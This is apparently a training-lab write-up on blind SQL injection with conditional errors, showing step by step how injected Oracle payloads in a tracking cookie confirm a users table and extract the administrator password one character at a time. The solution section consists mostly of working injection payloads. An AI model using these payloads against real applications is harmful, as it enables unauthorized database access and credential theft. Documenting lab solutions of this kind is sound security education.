**<h2>Background Conditional Error Responses</h2>**
Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. <br>
It's often possible to induce the application to return a different response depending on whether a SQL error occurs. We can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables us to infer the truth of the injected condition. 

**<h2>Problem</h2>**
The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. 

**<h2>Solution:</h2>**
- Check if tracking id shows any response for true and false condition, it shows no response for any conditions, but for incorrect syntax it shows error message ; ``Yolb'`` a single quote showed error while closing single quote with another single quote worked fine.
- Check if the error is actually caused by syntax error using subquery, ``' || (select '' ) ||'`` ; this caused error we confirm the database isn't mySQl
- Check with ``' || (select '' from dual ) ||'`` for oracle database; which did not give any error.
- Now check if the users table exists using ``' || (select '' from users where rownum=1 ) ||'`` we used rownum=1 parameter to only output ``''`` in first user from user table, ie if users table has 5 users ``''`` will be outputted in 5 different rows. The users table exists.
- Check if administrator user exists in users table using ``' || (select '' from users where username='administrator') ||' `` which does not produce error but it does not produce error for invalid user as well.
- For this we need `case`  syntax
`' || (select case when(1=0) then to_char(1/0) else '' end from dual)  ||'`  
    - there is a case which is FALSE already so it goes to else part and outputs empty string and we do not get error
    - if there was  `case when(1=1)` then `to_char(1/0)` would run which is false so it will give error

- Now to confirm admin user exists; ``' ||( select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||'`` 
    - from clause if evaluated before select clause so if users table has username administrator then it will perform select part which would run true case and give us error.
    - when we gave invalid user that didn’t exist in the database select case was not performed so it didnot give any error

![alt text](/images/lab12adminexist.png)

- Determine length of password using `` ' ||( select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>1)||'`` and use intruder to find the actual length of password So length of password is 20.
![alt text](/images/lab12intruderoutput.png)
- Now we find the password of the administrator user using ``' || (select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' and substr(password,1,1)='a')  ||'`` use cluster bomb to get password for each positions 
![alt text](/images/lab12password.png)
- login with password to solve lab
